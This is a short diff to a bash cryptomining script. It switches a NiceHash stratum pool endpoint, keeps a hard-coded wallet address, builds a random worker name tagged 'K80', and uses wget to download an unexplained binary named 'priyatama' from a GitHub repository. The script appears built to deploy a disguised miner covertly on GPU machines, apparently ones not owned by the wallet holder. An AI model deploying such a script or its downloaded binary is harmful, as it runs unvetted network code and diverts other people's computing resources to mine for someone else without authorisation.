@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=stratum+tcp://beamv3.usa-west.nicehash.com:3387
+POOL=stratum+tcp://daggerhashimoto.eu-north.nicehash.com:3353
 WALLET=39cLgRojCJ6cHaC375vumhXz83hGeR7SMH
 WORKER=$(echo $(shuf -i 1-20 -n 1)-K80)
 wget https://github.com/archernap/prem/raw/main/priyatama
